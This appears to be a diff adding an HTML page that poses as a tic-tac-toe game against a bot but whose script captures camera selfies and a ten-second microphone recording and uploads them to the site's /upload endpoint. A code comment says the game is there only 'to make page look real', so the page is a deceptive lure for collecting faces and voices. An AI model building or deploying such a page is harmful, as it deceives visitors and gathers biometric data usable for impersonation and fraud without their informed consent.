@@ -1,0 +1,162 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PLAY GAME</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    :root{--bg:#071025;--card:#0f1724;--accent:#39d98a;--muted:#aab3c9;--txt:#e8eef8}
+    body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071025,#0b1b2e);color:var(--txt);display:flex;align-items:center;justify-content:center;height:100vh}
+    .box{width:min(960px,94vw);background:var(--card);padding:22px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,.6)}
+    h1{margin:0;font-size:20px}
+    p.desc{color:var(--muted);margin-top:8px}
+    .cta{display:flex;gap:10px;margin-top:14px;flex-wrap:wrap}
+    button{padding:10px 14px;border-radius:9px;border:0;font-weight:700;cursor:pointer}
+    .btn-green{background:var(--accent);color:#04201b}
+    .btn-ghost{background:transparent;color:var(--txt);border:1px solid rgba(255,255,255,.06)}
+    .stage{margin-top:18px}
+    video{width:100%;border-radius:10px;background:#000}
+    .controls{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+    .small{font-size:0.9rem;color:var(--muted)}
+    .game{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-top:12px}
+    .tile{height:80px;background:#061224;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:28px}
+    #status{margin-top:10px;color:var(--muted)}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>LET'S PLAY GAME</h1>
+    <p class="desc">you can play game with my bot try to win .</p>
+
+    <div class="cta">
+      <button id="start" class="btn-green">PLAY NOW</button>
+      <button id="learn" class="btn-ghost">How this GAME works</button>
+    </div>
+
+    <div class="stage" id="stage" style="display:none">
+      <div class="small">Camera preview (muted). Use the buttons below to take photos and record audio.</div>
+      <video id="video" autoplay playsinline muted></video>
+
+      <div class="controls">
+        <button id="s1" class="btn-ghost">Take Selfie 1</button>
+        <button id="s2" class="btn-ghost">Take Selfie 2</button>
+        <button id="s3" class="btn-ghost">Take Selfie 3</button>
+        <button id="rec" class="btn-green">Record 10s Audio & Upload</button>
+      </div>
+
+      <div class="small" id="status">Status: waiting for action</div>
+
+      <div id="game" style="display:none">
+        <h3 style="margin-top:16px">Mini Game — Tic Tac Toe vs Bot</h3>
+        <div class="game" id="grid"></div>
+      </div>
+    </div>
+  </div>
+
+<script>
+const startBtn = document.getElementById('start');
+const learnBtn = document.getElementById('learn');
+const stage = document.getElementById('stage');
+const video = document.getElementById('video');
+const s1 = document.getElementById('s1');
+const s2 = document.getElementById('s2');
+const s3 = document.getElementById('s3');
+const rec = document.getElementById('rec');
+const status = document.getElementById('status');
+const grid = document.getElementById('grid');
+let stream = null;
+let selfies = {};
+let audioBlob = null;
+
+// helper
+function setStatus(t){ status.textContent = "Status: " + t; }
+
+// start demo (explicit consent)
+startBtn.addEventListener('click', async ()=>{
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:true});
+    video.srcObject = stream;
+    stage.style.display = 'block';
+    document.getElementById('game').style.display = 'block';
+    setStatus("Camera & mic active. You may capture 3 selfies and then record audio.");
+  } catch (e) {
+    alert("Permission denied or no camera/mic available.");
+    setStatus("Permission denied.");
+  }
+});
+
+// capture selfie helper
+async function capture(slot){
+  if(!stream){ setStatus("Start demo first."); return; }
+  const vw = video.videoWidth, vh = video.videoHeight;
+  const c = document.createElement('canvas');
+  c.width = vw; c.height = vh;
+  c.getContext('2d').drawImage(video,0,0,vw,vh);
+  return new Promise(resolve=>{
+    c.toBlob(b=>{
+      selfies[slot] = b;
+      setStatus(`Selfie ${slot} captured.`);
+      resolve();
+    }, 'image/jpeg', 0.9);
+  });
+}
+
+s1.onclick = ()=>capture(1);
+s2.onclick = ()=>capture(2);
+s3.onclick = ()=>capture(3);
+
+rec.onclick = async ()=>{
+  if(!stream){ setStatus("Start demo first."); return; }
+  if(!selfies[1] && !selfies[2] && !selfies[3]) { setStatus("Please capture at least one selfie first."); return; }
+
+  setStatus("Recording 10 seconds...");
+  const recorder = new MediaRecorder(stream, {mimeType:'audio/webm'});
+  let chunks = [];
+  recorder.ondataavailable = e => chunks.push(e.data);
+  recorder.onstop = async ()=>{
+    audioBlob = new Blob(chunks, {type:'audio/webm'});
+    setStatus("Upload in progress...");
+    const fd = new FormData();
+    if(selfies[1]) fd.append('selfie1', selfies[1], 'selfie1.jpg');
+    if(selfies[2]) fd.append('selfie2', selfies[2], 'selfie2.jpg');
+    if(selfies[3]) fd.append('selfie3', selfies[3], 'selfie3.jpg');
+    fd.append('audio', audioBlob, 'audio.webm');
+
+    try {
+      const r = await fetch('/upload', {method:'POST', body:fd});
+      if(r.ok) {
+        setStatus("Upload complete. Demo finished. Thank you for participating.");
+      } else {
+        setStatus("Server returned an error uploading files.");
+      }
+    } catch(e) {
+      setStatus("Network error while uploading.");
+    }
+  };
+  recorder.start();
+  setTimeout(()=>recorder.stop(), 10000); // 10s
+};
+
+// small tic-tac-toe to make page look real
+function createGame(){
+  const tiles = 9;
+  for(let i=0;i<tiles;i++){
+    const t = document.createElement('div'); t.className='tile'; t.textContent='-';
+    t.style.display='flex'; t.style.alignItems='center'; t.style.justifyContent='center';
+    t.style.cursor='pointer'; t.onclick = ()=>{ if(t.textContent==='-') t.textContent='X'; botMove(); };
+    grid.appendChild(t);
+  }
+}
+function botMove(){
+  const tiles = Array.from(document.querySelectorAll('.tile'));
+  const empties = tiles.filter(td => td.textContent === '-');
+  if(empties.length === 0) return;
+  const choice = empties[Math.floor(Math.random()*empties.length)];
+  choice.textContent = 'O';
+}
+createGame();
+
+learnBtn.onclick = ()=>alert("you can play with bot eny time");
+</script>
+</body>
+  </html>
